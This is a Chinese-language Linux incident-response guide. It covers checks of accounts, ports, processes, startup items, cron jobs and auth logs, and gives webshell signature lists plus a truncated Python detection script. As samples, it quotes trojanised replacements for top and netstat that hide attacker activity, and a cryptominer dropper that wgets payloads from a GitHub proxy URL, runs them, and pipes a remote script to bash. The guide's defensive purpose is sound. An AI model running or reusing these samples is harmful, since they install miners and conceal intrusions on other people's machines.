<a name="uXESM"></a>
## 一. 账户安全
/etc/passwd<br />/etc/shadow<br />格式：<br />用户名：密码：用户ID：组ID：用户说明：家（home）目录：登陆之后shell<br />注意：无密码只允许本机登陆，远程不允许ssh登陆<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942134-d282b68c-bc5d-43c7-95dd-a50d1f02d5aa.png#averageHue=%232f2f2f&height=502&id=EUCMB&originHeight=502&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=963)<br />用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留

其中
:::tips
root:$6$KNodydj1e.cDKFds$YdpMlNRn19MIpho5uE1lEr0tKB0OZqGQfJDZf4p/fCMQIZOBbJRco70ojbUYbY4r1fYyLXa0V8ZWYbxGvMTr71::0:99999:7:::
:::
root=用户名<br />6=sha512加密（1 代表 MD5，2y、2a代表Blowfish，5 代表 SHA-256，6 代表 SHA-512）<br />KNodydj1e.cDKFds=盐<br />YdpMlNRn19MIpho5uE1lEr0tKB0OZqGQfJDZf4p/fCMQIZOBbJRco70ojbUYbY4r1fYyLXa0V8ZWYbxGvMTr71=加密过后的数据<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942262-a9fb5ac1-6219-417a-877b-79b69f1cf004.png#averageHue=%232c2c2c&height=470&id=CSoYC&originHeight=470&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=964)
<a name="eNNKj"></a>
### 1.1 查询特权账户 & 组
```
awk -F: '$3==0{print $1}' /etc/passwd
awk -F: '$4==0{print $1}' /etc/passwd
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942374-1404698b-33b3-4e41-8b3e-75a147e02999.png#averageHue=%23292929&height=242&id=lcd90&originHeight=242&originWidth=961&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=961)
<a name="cae0h"></a>
### 1.2 查询可远程登录账户及其它信息
```
awk '/\$1|\$6/{print $1}' /etc/shadow   #可以远程登录的账号
cat /etc/passwd | grep /bin/bash #查看哪些用户使用shell
cat /etc/passwd | grep x:0 #查看哪些用户为root权限
cat /etc/passwd | grep -v nologin #查看除了不可登录以外的用户都有哪些，有没有新增的
```
```
who #查看当前登录用户（tty 本地登陆   pts 远程登录）
w   #查看系统信息，想知道某一时刻用户的行为
uptime  #查看登陆多久、多少用户，负载
stat /etc/passwd #查看密码文件上一次修改的时间
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942458-b95ee1cb-086a-46eb-86c7-c5383c62e628.png#averageHue=%23323232&height=384&id=xzcR9&originHeight=384&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=760)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942568-b8fd7954-0e4f-463f-bad3-1fb2e7de3cf9.png#averageHue=%23333333&height=339&id=iIIN4&originHeight=339&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=645)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942662-cd545f18-747d-4737-924c-5f743bcf61d4.png#averageHue=%232b2b2b&height=245&id=PMFMA&originHeight=245&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1335)
<a name="iKogq"></a>
### 1.3 查询 sudo 权限账户
```
more /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942771-e09a65bd-8962-4b1b-9adc-e8740dfd4212.png#averageHue=%23272727&height=229&id=nV2lw&originHeight=229&originWidth=962&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=962)
<a name="HBSLz"></a>
### 1.4 禁用or删除账户
```
usermod -L username #锁定
userdel username #删除
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942854-022e1177-18e7-4455-af05-fd1195757b42.png#averageHue=%232f2e2e&height=928&id=yDSvG&originHeight=928&originWidth=964&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=964)
<a name="bolcL"></a>
### 1.5 用户历史命令
```
cat /home/hack/.bash_history
history #root历史命令
root/.bash_profile
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040942980-b76ef2e2-1c58-49e2-af45-6ca49170b492.png#averageHue=%23272727&height=302&id=YVOph&originHeight=302&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=955)
<a name="AhhV5"></a>
## 二. 异常端口进程服务文件
<a name="Tzlkn"></a>
### 2.1 端口
```
netstat -atnlp
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943105-685f85eb-45f9-4fba-b97a-0598a760d762.png#averageHue=%23353333&height=308&id=KqJgD&originHeight=308&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=958)
```
cat /proc/PID/exe | more
ls -l /proc/PID/exe
netstat -antlp | grep 异常IP | awk '{print $7}' | cut -f1 -d"/"
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943209-9fda5bdb-476c-4dc1-ada5-0a82c17d44ab.png#averageHue=%23292929&height=448&id=sScEV&originHeight=448&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=958)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943302-667b177f-4565-493f-8aef-7c49d153683f.png#averageHue=%232f2f2f&height=583&id=ORHZr&originHeight=583&originWidth=1093&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1093)
<a name="VTLbR"></a>
### 2.2 进程
```
ps aux | grep PIDnet
file /proc/PID/exe
/proc/7252/exe: symbolic link to '/usr/bin/php'
```
```
ps aux --sort=pcpu | head -10     #查看cpu占用率前十的进程
ps  -ef  --sort  -pcpu  #按CPU 使用率从高到底排序
ps -ef --sort -pmem  #按内存从高到低
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943417-80a8ae25-d312-472d-b12e-ec7d0da6fee2.png#averageHue=%23303030&height=559&id=MeHO1&originHeight=559&originWidth=1065&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1065)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943541-da81ecdb-174e-4bb9-b55d-a49cae2fc168.png#averageHue=%232d2d2d&height=598&id=GoLvJ&originHeight=598&originWidth=1458&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1458)
<a name="JTSsh"></a>
### 2.3 使用 lsof分析进程
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943680-b9a420fb-4cb4-4a6f-9f1f-c1c151863847.png#averageHue=%23393939&height=546&id=dDGuc&originHeight=546&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1003)<br />将样本输出，在情报网络上查询该样本
:::tips
cat /proc/$PID/exe > /tmp/t.bin
:::

使用 ps 查看启动 时间并 杀掉危险进程
```
ps -p 7224 -o lstart
kill -9 7224
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943804-9e46b834-df33-402d-b2a3-ec45a8a4d87b.png#averageHue=%232e2e2e&height=243&id=dx6VL&originHeight=243&originWidth=1099&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1099)
<a name="hgZUx"></a>
### 2.4 服务
```
chkconfig #查看开机启动项目
chkconfig   --list #查看服务自启状态
systemctl list-unit-files |grep enabled #ubuntu，centos及使用 systemctl 控制的系统
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655117951399-2fb75916-3119-4326-b948-1cf4a70d9347.png#averageHue=%23303030&clientId=u41f917de-8730-4&from=paste&height=289&id=u47b481d8&name=image.png&originHeight=577&originWidth=444&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95754&status=done&style=none&taskId=u99295be8-0de9-4d84-a515-f9b695b3a38&title=&width=222)
<a name="nfDqr"></a>
### 2.5 文件
很多时候会遇到无法常看文件权限或是病毒在一直向某个文件写入程序，可尝试如下命令：<br />lsattr 文件 查看权限<br />chattr -i 文件 接触文件后删除

被篡改的系统工具，被赋予了特殊权限ia，i：不能修改，保存设置其它链接关系，a：只能添加数据，不能删除。

chattr -ia 删除该文件特殊ia权限

![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1674885135496-0af8dcba-e444-423e-8115-fe6c78d08fea.png#averageHue=%232c3638&clientId=u8b88ba14-b50c-4&from=paste&height=445&id=u398d3e0f&name=image.png&originHeight=980&originWidth=512&originalType=binary&ratio=1&rotation=0&showTitle=false&size=756882&status=done&style=none&taskId=u3a9f7de6-e192-4ec6-9791-4106382cebf&title=&width=232.72726768304506)

stat查看文件修改创建等信息

![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1674885419761-bcdfe799-de0e-4396-8377-ec63f8a1e990.png#averageHue=%23374346&clientId=u8b88ba14-b50c-4&from=paste&height=115&id=ude882b1f&name=image.png&originHeight=254&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&size=263667&status=done&style=none&taskId=uc977108f-845f-4c44-bfc4-7d750456292&title=&width=379.0909008743351)


攻击者可能会篡改系统自带的工具，将工具输出重定向，导致我们不能看到想看到的信息

比如：
```bash
#!/bin/sh
if [ "`whoami`" == "root"  ] ;then
sh -c "execute > /dev/null 2>&1 &"
fi
/usr/sbin/top
sh -c "flush > /dev/null 2>&1 &"
```

```bash
#!/bin/sh
isi="$1 $2 $3 $4 $5 $6 $7 $8 $9"; [ -z "$isi" ] && /usr/bin/power || /usr/bin/power $isi
if [ "`whoami`" != "root"  ] ;then
exit 0
fi
if test -r /bin/mouse; then
pid=$(cat /bin/mouse)
if $(kill -CHLD $pid >/dev/null 2>&1)
then
exit 0
fi
fi
sh -c "/bin/crond > /dev/null 2>&1 &"
sh -c "chmod 755 /bin/mouse > /dev/null 2>&1 &"
```

```bash

#!/bin/sh
if [ "`whoami`" == "root"  ] ;then
sh -c "chattr -ia /tmp > /dev/null 2>&1 &"
sh -c "chmod 777 /tmp > /dev/null 2>&1 &"
fi
isi="$1 $2 $3 $4 $5 $6 $7 $8 $9"; [ -z "$isi" ] && /usr/bin/netstatz || /usr/bin/netstatz $isi > /tmp/`whoami`.net
cat /tmp/`whoami`.net |grep --invert-match :20 |grep --invert-match :43 |grep --invert-match send |grep --invert-match dhcl |grep --invert-match sendmail:
rm -f /tmp/`whoami`.net
```

被恶意修改后的系统工具向外发出外联<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1674885450641-61b5653a-0614-43c1-9d94-1c84f0659509.png#averageHue=%232f2832&clientId=u8b88ba14-b50c-4&from=paste&height=315&id=ua3860389&name=image.png&originHeight=692&originWidth=992&originalType=binary&ratio=1&rotation=0&showTitle=false&size=862805&status=done&style=none&taskId=ub3b5e23d-0baa-4130-9c55-37c2e671668&title=&width=450.9090811358998)

恶意sshkey文件，配合计划任务做权限维持

![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1674885563875-0f24d09a-a041-4e4c-8b8b-25a53eed5a27.png#averageHue=%2317181b&clientId=u8b88ba14-b50c-4&from=paste&height=225&id=uaccbd67f&name=image.png&originHeight=496&originWidth=999&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185171&status=done&style=none&taskId=u6444c3c6-b542-49ec-800e-6e65a89c203&title=&width=454.0908992487539)

find
```
find / -ctime 0 -name "*.sh"  #-n指n天以内
```


<a name="mDGAW"></a>
### 2.6 其它
host 文件<br />`/etc/hosts`<br />find 命令<br />md5sum 命令<br />grep 命令<br />diff 命令<br />很多情况下，存在ps、netstat等一些常见命令被替换，可利用stat查看该状态，查看其修改时间<br />`stat /bin/netstat`<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943889-0c3f27e9-eb75-4f3c-9398-7b5ee587d379.png#averageHue=%23323232&height=214&id=fbCsY&originHeight=214&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=669)



在找攻击链时，会找到类似这种脚本，这种脚本就是挖矿病毒下载的脚本
```bash
killall -9 dos64
killall -9 dos32
killall -9 dos24
killall -9 dos26
killall -9 tfq
killall -9 xmrig
rm -rf cd /tmp/dos64
rm -rf cd /tmp/dos32
rm -rf cd /tmp/dos24
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
if [ ! -w "/tmp/dos64" ]; then
cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;chmod 777 dos64;./dos64
fi

if [ ! -w "/tmp/dos32" ]; then
cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos32;chmod 777 dos32;./dos32
fi

if [ ! -w "/tmp/dos24" ]; then
cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos24;chmod 777 dos24;./dos24
fi

if [ ! -w "/tmp/dos26" ]; then
cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos26;chmod 777 dos26;./dos26
fi

if [ ! -w "/tmp/tfq" ]; then
cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/tfq;chmod 777 tfq;./tfq
fi

if [ ! -w "/root/c3pool/xmrig" ]; then
curl -s -L https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
fi
rm -rf cd /tmp/dos64
rm -rf cd /tmp/dos32
rm -rf cd /tmp/dos24
rm -rf cd /tmp/dos26
rm -rf cd /tmp/tfq
sleep 88;rm -rf cd /root/c3poolb
```
<a name="MClCq"></a>
## 三. 启动项与定时任务
系统运行级别：
```
l  0 所有进程将被终止，机器将有序的停止，关机时系统处于这个运行级别
l  1 单用户模式。用于系统维护，只有少数进程运行，同时所有服务也不启动
l  2多用户模式。和运行级别3一样，只是网络文件系统(NFS)服务没被启动
l  3多用户模式。允许多用户登录系统，是系统默认的启动级别
l  4留给用户自定义的运行级别
l  5多用户模式，并且在系统启动后运行X-Window，给出一个图形化的登录窗口
l  6所有进程被终止，系统重新启动
```
默认 级别 `/etc/inittab`<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040943970-37f58a67-725e-4efe-bf3d-cb587ad4c791.png#averageHue=%23262626&height=510&id=pZrii&originHeight=510&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=966)
<a name="G6Tkj"></a>
### 3.1 开机启动文件
`/etc/rc.local`<br />`/etc/rc.d/rc[0~6].d`<br />`/etc/rc.d/rc3.d/`<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944072-d225d0a9-859c-483e-83ca-ef728a60ea94.png#averageHue=%23252525&height=502&id=P9nsz&originHeight=502&originWidth=954&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=954)<br />排查环境变量<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944170-4f78b9db-580f-438a-9166-84f4fa5f6815.png#averageHue=%232d2d2d&height=455&id=aQ41X&originHeight=455&originWidth=652&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=652)
<a name="gMUfv"></a>
### 3.2 定时任务
计划任务文件
```
/var/spool/cron/* #centos
/var/spool/cron/crontabs/* #ubuntu的
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/* 
/etc/cron.hourly/* 
/etc/cron.monthly/*
/etc/cron.weekly/
/etc/anacrontab #异步定时
/var/spool/anacron/*
```
/etc/cron.daily/*   查看目录下所有文件
```
crontab   -l #查看定时任务
crontab –e #编辑定时任务
crontab -u root –l   #查看root用户任务计划
ls /var/spoocl/cron/   #查看每个用户自己的执行计划
sed '/gcc.sh/d' /etc/crontab && chmod 0000 /etc/crontab && chattr +i /etc/crontab   #删除计划任务且控制计划任务不能写东西，慎用。
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944276-b7b49710-433e-4616-9729-7b28aa562120.png#averageHue=%232f2f2f&height=375&id=jF3HI&originHeight=375&originWidth=956&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=956)


恶意的计划任务

![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1674885504778-09269002-236d-4b4c-b40f-571e057551f3.png#averageHue=%23595d5f&clientId=u8b88ba14-b50c-4&from=paste&height=191&id=ued08169b&name=image.png&originHeight=420&originWidth=1338&originalType=binary&ratio=1&rotation=0&showTitle=false&size=421731&status=done&style=none&taskId=u4c1aff66-827d-4896-acdb-a005bab4672&title=&width=608.1818049998326)
<a name="IR69C"></a>
### 3.3 日志
系统常见的日志目录

| 文件名 | 说明 |
| --- | --- |
| cron | 记录系统定时任务相关 |
| dmesg | 记录了系统在开机时内核自检的信息 |
| btmp | 记录二进制错误登录日志，使用lastb查看 |
| lastlog | 记录二进制系统中所有用户最后一次登录时间的日志 |
| secure | 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，telnet，ftp等服务登录信息 |
| message | 记录系统启动后的信息和错误日志 |
| wtmp | 登录进入，退出，数据交换、关机和重启纪录 |


Ubuntu：/var/log/auth.log<br />Centos：/var/log/secure

默认日志位置：/var/log/<br />/var/log/auth.log包含系统授权信息，包括用户登录和使用的权限机制等信息<br />/var/log/lastlog记录登录的用户，可以使用命令lastlog查看<br />/var/log/secure记录大多数应用输入的账号与密码，登录成功与否<br />日志一般信息量巨大，根据自己的环境索引相关的有效的 信息<br />/var/log/cron记录crontab命令是否被正确的执行<br />/var/log/message 系统整体信息
<a name="S37LV"></a>
#### ubuntu
<a name="pu0qt"></a>
##### 判断爆破
判断是否被爆破，如果在相近时间出现大量Failed password，说明被爆破
```
cat /var/log/auth.log | grep "Failed password for root"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1679301428987-b9440354-eb10-42ce-b7e2-14e6a04d26a1.png#averageHue=%231b1818&clientId=u00787820-cd77-4&from=paste&height=738&id=u2f87aafc&name=image.png&originHeight=1624&originWidth=2880&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=924306&status=done&style=none&taskId=u8cb0d129-a709-49eb-9079-04bed4a763d&title=&width=1309.0908807171284)<br />记录登陆的用户
```
cat /var/log/auth.log | grep "Accept"
```
计算登录失败的用户名及次数
```
cat /var/log/auth.log | grep "Failed password" | perl -e 'while($_=<>){ /for(.*?)from/; print "$1\n";}'|sort|uniq -c|sort -nr
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/27875807/1679301490265-43208319-055e-4bfe-ac0f-13fbdec3daa2.png#averageHue=%230f0f0f&clientId=u00787820-cd77-4&from=paste&height=738&id=u36bf3db5&name=image.png&originHeight=1624&originWidth=2880&originalType=binary&ratio=2.200000047683716&rotation=0&showTitle=false&size=261127&status=done&style=none&taskId=u48bb3dab-2f61-45b3-a83e-e1c9bdd13da&title=&width=1309.0908807171284)<br />统计爆破者ip及次数
```
cat /var/log/auth.log | grep "Failed password for" | grep "root" | grep -Po '(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)){3}' |sort|uniq -c|sort -nr
```



<a name="rS3Jd"></a>
#### centos
**定位有多少IP在爆破主机的root帐号**
```
grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
```
<a name="tRq8k"></a>
###### 定位有哪些IP在爆破：
```
grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c
```
<a name="IIuXf"></a>
###### 爆破用户名字典是什么？
```
grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
```
<a name="YLR4D"></a>
##### 登录成功的IP有哪些：
```
grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more
```
<a name="YVPOi"></a>
##### 登录成功的日期、用户名、IP：
```
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
```
![](https://img-blog.csdnimg.cn/20210114183211128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center#id=jNI1D&originHeight=587&originWidth=1026&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
<a name="zVcpN"></a>
#### WEB日志
<a name="yinOz"></a>
##### WEB日志中的敏感特征
文件内容中的恶意函数
```bash
PHP：eval(、system(、assert(
JSP：getRunTime(、 FileOutputStream(
ASP：eval(、execute(、 ExecuteGlobal（
```
webshell特征
```bash
Darkblade：goaction=login
JspSpy：o=login
PhpSpy：action=phpinfo
Regeorg：cmd=connect
Other：cmd=
```
<a name="yDVmf"></a>
### 3.4 自动化辅助工具
[https://github.com/grayddq/GScan](https://github.com/grayddq/GScan)<br />[https://github.com/ppabc/security_check](https://github.com/ppabc/security_check)<br />[https://github.com/T0xst/linux](https://github.com/T0xst/linux)<br />[https://github.com/P4ck/Emergency](https://github.com/P4ck/Emergency)<br />[https://github.com/al0ne/LinuxCheck](https://github.com/al0ne/LinuxCheck)
```bash
#! /bin/bash
# linux-info v0.1
echo "-------------------------机器名-------------------------"
hostname
echo "-------------------------查看用户信息-------------------------"
cat /etc/passwd |grep -v nologin |grep -v /bin/false
echo "-------------------------查看登录信息-------------------------"
w
echo "-------------------------查看正在连接的IP-------------------------"
netstat -antlp |grep ESTABLISHED
echo "-------------------------查看对外监听的端口-------------------------"
netstat -antlp |grep LISTEN | grep -v 127.0.0.1
echo "-------------------------查看历史登录信息-------------------------"
last -F -n 10
echo "-------------------------查看安全日志中登录成功信息-------------------------"
grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'
echo "-------------------------查看历史命令，查找外联-------------------------"
history | grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
echo "-------------------------查看计划任务-------------------------"
crontab -l
echo "-------------------------查找隐藏文件-------------------------"
find / ! -path "/proc/*" ! -path "/usr/*" ! -path "/var/*" ! -path "/sys/*" -name ".*" -print
echo "-------------------------其他·提示-------------------------"
echo "查看用户进程：lsof -u hack"
echo "查看端口占用：lsof -i:8888"
echo "查看公钥信息：~/.ssh/id_dsa.pub"
echo "查看进程：ps -aux"
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944373-d23ed483-ad22-4270-bda1-b916803ae0e8.png#averageHue=%23343434&height=1038&id=SZlAw&originHeight=1038&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1920)
<a name="vGfEM"></a>
### 3.5 勒索病毒引擎
深信服<br />[https://edr.sangfor.com.cn/#/information/ransom_search](https://edr.sangfor.com.cn/#/information/ransom_search)<br />360<br />[https://lesuobingdu.360.cn/](https://lesuobingdu.360.cn/)<br />奇安信<br />[https://lesuobingdu.qianxin.com/](https://lesuobingdu.qianxin.com/)<br />腾讯<br />[https://guanjia.qq.com/pr/ls/](https://guanjia.qq.com/pr/ls/)<br />VenusEye<br />[https://lesuo.venuseye.com.cn/](https://lesuo.venuseye.com.cn/)
<a name="LAIHY"></a>
### 3.6 反勒索病毒工具
腾讯<br />[https://habo.qq.com/tool/index](https://habo.qq.com/tool/index)<br />金山毒霸<br />[https://www.duba.net/dbt/wannacry.html](https://www.duba.net/dbt/wannacry.html)<br />瑞星<br />[http://it.rising.com.cn/fanglesuo/index.html](http://it.rising.com.cn/fanglesuo/index.html)<br />Avast<br />[https://www.avast.com/zh-cn/ransomware-decryption-tools](https://www.avast.com/zh-cn/ransomware-decryption-tools)<br />Github tools<br />[https://github.com/jiansiting/Decryption-Tools](https://github.com/jiansiting/Decryption-Tools)
<a name="ccm8B"></a>
### 3.7 溯源分析脚本
1、非工作时间段是否有登录行为<br />2、当日是否有新建/登录失败纪录<br />3、指定监控目录是否有webshell文件<br />4、查看是否有新建非法用户<br />5、查看是否有外联异常端口<br />6、检测access日志，分析当天攻击行为
```bash
#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import re
TRUST_USER = ['root','piaox']
TRUST_IP =['10.0.211.71']
FILE_PATH=['/var/www/html','/tmp','/var/tmp','/home']
FILE_LIST =[]
ACCESS_LOG = '/var/log/httpd/access_log'
php_Features_list = [
'(\$_(?:GET|POST|REQUEST)\[.*?](\s|\n)*\((\s|\n)*\$_(?:GET|POST|REQUEST)\[.*?\](\s|\n)*\))',
'(?:base64_decode)\([\'"][\w\+/=]{200,}[\'"]\)',
'function\_exists\s*\(\s*[\'"](popen|exec|proc\_open|system|passthru)+[\'"]\s*\)',
'@?(eval\_?r?|assert|include|require|include\_once|require\_once|array\_map|array\_walk)+\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[?(.*)\]?\s*\)',
'eval\s*\(\s*\(\s*\$\$(\w+)',
'(\$[\w_]{0,15}(\s|\n)*\((\s|\n)*\$_(?:POST|GET|REQUEST)\[.*?\](\s|\n)*\))',
'(ReDuh|silic)',
'(?:call_user_func)(\s|\n)*\(.{0,15}\$_(?:GET|POST|REQUEST)',
'(?:wscript)\.(?:shell)',
'(?:cmd)\.(?:exe)',
'(?:shell)\.(?:application)',
'(?:documents)\s+(?:and)\s+(?:settings)',
'(?:system32)',
'(?:serv\-u)',
'(?:phpspy)',
'(?:webshell)',
'(?:Program)\s+(?:Files)',
'(?:include|require)(?:_once)?\s*["\']?\(?\s*\$?\w+["\']?\)?\s*\;?',
'ec38fe2a8497e0a8d6d349b3533038cb|88f078ec861a3e4baeb858e1b4308ef0|7Zt/TBNnGMfflrqBFnaes|\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00|9c3a9720372fdfac053882f578e65846|silic1234',
'((udp|tcp)\://(.*)\;)+',
'preg\_replace\s*\((.*)/e(.*)\,\s*\$\_\[?(.*)\]?\,(.*)\)',
'preg\_replace\s*\((.*)\(base64\_decode\(\$',
'.*?\$\_\w+.*?@?preg_replace\(("|\').*?/e("|\'),.*?,.*?\)',
'(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*(base64\_decode|str\_rot13|gz(\w+)|file\_(\w+)\_contents|(.*)php\://input)+',
'(include|require|include\_once|require\_once)+\s*\(\s*[\'"](\w+)\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\'"]\s*\)',
'\$\_(\w+)\s*=?\s*(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*\$(\w+)\s*\)',
'\(\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$\_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\)',
'(fopen|fwrite|fputs|file\_put\_contents)+\s*\((.*)\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\](.*)\)',
'(fopen|fwrite|fputs|file\_put\_contents)+\s*\(\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\](.*)\)',
'echo\s*curl\_exec\s*\(\s*\$(\w+)\s*\)',
'new com\s*\(\s*[\'"]shell(.*)[\'"]\s*\)',
'\$(.*)\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\)',
'\$\_\=(.*)\$\_',
'\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\(\s*\$(.*)\)',
'\$(\w+)\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER)+\[(.*)\]\s*\)',
'\$(\w+)\s*\(\s*\$\{(.*)\}',
'\$(\w+)\s*\(\s*chr\(\d+\)',
'\$\w*\s*\=\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)\[.*?\]\;\s*include\s+\(\s*\$(.*?)\s*\)\;',
'\$\w+\s*\=\s*\$\_\w+\[.*?\]\;\s*@eval\(.*?\)',
'\$\w+\s*\=\s*base64_decode\(\$\_\w+\[(.*?)\]\);\s*@eval\(.*?\)',
'\$\_\w+\[.*?\]\s*\(\s*\$\_\w+\[.*?\]\s*\)\;',
'\(\$\_\=@\$\_\w+\[.*?\]\s*\)\.@\$\_\(\$\_\w+\[.*?\]\s*\)',
'\$\_\w+\[.*?\]\s*\(\s*\$\_\w+\[.*?\]\s*,\$\_\w+\[.*?\]\)',
'\$\{\'\_\'.\$\_}\[\'\_\'\]\(\$\{\'\_\'.\$\_\}\[\'\_\_\'\]\)\;',
'\_\_angel\_1111111111\_eof\_\_',
'xx.php\?pwd=e',
'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067',
'Changed by pnkoo.cn|Jakub Vrana|blackbap.org|Code By isosky|16jTwyAtIHBocCZNeVNRTMr9vt2/4rG4t925pL7fIC0g']
asp_Features_list = [
'(?:eval|execute)(\s|\n)*(?:request)(\s|\n)*\((\s|\n)*(.*?)(\s|\n)*\)',
'(?:eval)(\s|\n)*\((\s|\n)*(?:Request)(\s|\n)*\.(\s|\n)*(?:Item)(\s|\n)*\[(\s|\n)*(.*?)(\s|\n)*\]',
'(?:ExecuteStatement)\(.*?request',
'FromBase64String\("UmVxdWVzdC5JdGVtWyJ6Il0="\)',
'tseuqer\s*lave.*',
'Request.form(.*)eval(.*)',
